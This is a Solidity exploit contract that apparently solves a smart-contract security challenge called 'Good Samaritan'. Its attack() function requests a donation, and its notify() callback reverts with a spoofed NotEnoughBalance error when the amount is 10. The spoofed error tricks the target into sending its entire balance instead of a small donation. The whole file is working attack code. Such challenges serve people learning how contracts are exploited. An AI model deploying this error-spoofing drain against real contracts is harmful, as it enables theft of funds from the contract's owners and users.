// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "./GoodSamaritan.sol";

contract GoodSamaritanAttacker {

    error NotEnoughBalance();

    address goodSamaritan;

    constructor(address _goodSamaritan) {
        require(_goodSamaritan != address(0));
        goodSamaritan = _goodSamaritan;
    }

    function attack() external {
        GoodSamaritan(goodSamaritan).requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}
